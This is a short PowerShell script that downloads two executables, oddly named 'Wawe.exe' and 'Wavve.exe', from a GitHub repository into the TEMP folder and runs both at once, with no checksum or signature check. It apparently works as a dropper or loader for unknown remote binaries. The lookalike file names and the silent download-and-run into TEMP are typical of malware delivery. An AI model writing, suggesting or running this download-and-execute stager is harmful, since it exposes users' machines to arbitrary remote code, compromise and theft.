[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$base = 'https://github.com/jesuss13377-source/wa/raw/refs/heads/main/'
$d1 = "$env:TEMP\Wawe.exe"
$d2 = "$env:TEMP\Wavve.exe"
Remove-Item $d1 -Force -ErrorAction SilentlyContinue
Remove-Item $d2 -Force -ErrorAction SilentlyContinue
curl.exe -L -o $d1 ($base + 'Wawe.exe')
curl.exe -L -o $d2 ($base + 'Wavve.exe')
if (Test-Path $d1) { Start-Process -FilePath $d1 }
if (Test-Path $d2) { Start-Process -FilePath $d2 }
